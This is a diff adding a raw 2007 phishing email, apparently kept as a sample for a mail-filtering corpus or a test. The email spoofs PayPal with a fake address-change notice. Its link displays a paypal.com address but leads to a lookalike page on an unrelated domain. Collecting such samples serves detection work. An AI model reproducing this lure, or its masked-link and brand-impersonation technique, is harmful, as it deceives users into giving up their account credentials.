@@ -1,0 +1,57 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <customer@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id DB6E4468F2
+ for <user@login.example.com>; Sun,  4 Mar 2007 22:02:41 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id BD6A9131F9D7
+ for <user@example.com>; Sun,  4 Mar 2007 22:02:41 -0500 (EST)
+Received: from cartridgetech.com (cartridgetech.com [72.32.11.52])
+ by mail.example.org (Postfix) with ESMTP id CE4166FA1C4
+ for <user@example.com>; Sun,  4 Mar 2007 22:02:41 -0500 (EST)
+Received: from User (unknown [203.124.21.178])
+ by cartridgetech.com (Postfix) with ESMTP id 2FD787B4625;
+ Sun,  4 Mar 2007 21:02:21 -0600 (CST)
+From: "PayPal"<customer@paypal.com>
+Subject: Notification from Billing Department
+Date: Mon, 5 Mar 2007 08:31:21 +0530
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070305030222.2FD787B4625@cartridgetech.com>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 924
+
+<FONT face=Verdana>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR vAlign=top>
+<TD><A href="https://www.paypal.com/us" target=_blank><FONT size=2><IMG alt=PayPal src="http://images.paypal.com/en_US/i/logo/email_logo.gif" border=0></FONT></A></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+<TBODY>
+<TR>
+<TD width="100%" background=http://images.paypal.com/en_US/i/scr/bg_clk.gif><FONT size=2><IMG height=29 alt="" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1 border=0></FONT></TD></TR>
+<TR>
+<TD><FONT size=2><IMG height=10 alt="" src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1 border=0></FONT></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR>
+<TD><FONT size=2></FONT></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+<TBODY>
+<TR vAlign=top>
+<TD width="100%"><BR><FONT size=2>This email confirms that you have added the following address to your account:<BR><BR>19 Wormwood St Apt #65<BR>Boston,&nbsp;MA&nbsp;02210<BR>United States<BR><BR>If you want to make any changes please click on the link below :<BR><BR><A href="http://cbisis.be/.,/lndex.html?co_partnerId=2&siteid=0&pageType=-1&errmsg=8&pa1=&i1=-1DATA=SabuKatVpl37b$$jbabuKatVpl37b2ol37b2oaabuKatVpl37b2oaszrQTGVnCTmsPv&a/20%&UsingSSL=0&bshowgif=0" target="">http://www.paypal.com/update/billing/address.html</A><BR><BR>Thank you.<BR><BR>Sincerely,<BR>PayPal<BR><BR>Did you know:<BR><BR><BR>EBAY HAS PRODUCTS FOR YOUR NEW HOME<BR><BR>* Lawn Mowers * Faucets * BBQs * Furniture<BR>* Spas &amp; Pools * Flowers * Lamps * Vacuums<BR>* Major Appliances * Plants * Tools * Wallpaper<BR><BR>Go to http://home.ebay.com<BR><BR>
+
+<BR><BR><SPAN classxptFooter>
+<HR width=400>
+</SPAN><BR><SPAN class=xptFooter>PayPal Email ID PP006</SPAN></FONT></TD></TR></TBODY></TABLE><FONT size=2> </FONT></FONT>
